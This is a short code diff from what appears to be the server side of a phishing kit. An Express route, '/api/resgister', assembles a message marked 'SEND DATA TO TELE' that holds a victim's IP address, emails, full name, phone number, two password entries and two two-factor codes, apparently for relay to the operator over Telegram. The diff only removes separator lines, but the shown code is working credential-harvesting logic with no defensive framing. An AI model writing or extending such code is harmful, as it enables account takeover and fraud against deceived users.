@@ -26,7 +26,6 @@ app.post('/api/resgister', (req, res) => {
 
     // SEND DATA TO TELE
     const message = `<strong>Ip:</strong> ${data.ip ? data.ip : ''}
---------------------------
 <strong>Email Business:</strong> ${data.businessEmail ? data.businessEmail : ''} 
 <strong>Email Personal:</strong> ${data.personalEmail ? data.personalEmail : ''}
 <strong>Full Name:</strong> ${data.fullName ? data.fullName : ''} 
@@ -34,7 +33,6 @@ app.post('/api/resgister', (req, res) => {
 <strong>Phone Number:</strong> ${data.mobilePhone ? data.mobilePhone : ''}
 <strong>Password First:</strong> ${data.passwordFirst ? data.passwordFirst : ''}
 <strong>Password Second:</strong> ${data.passwordSecond ? data.passwordSecond : ''}
---------------------------
 <strong>First Two-Fa:</strong> ${data.firstTwoFa ? data.firstTwoFa : ''}
 <strong>Second Two-Fa:</strong> ${data.secondTwoFa ? data.secondTwoFa : ''}`;
 
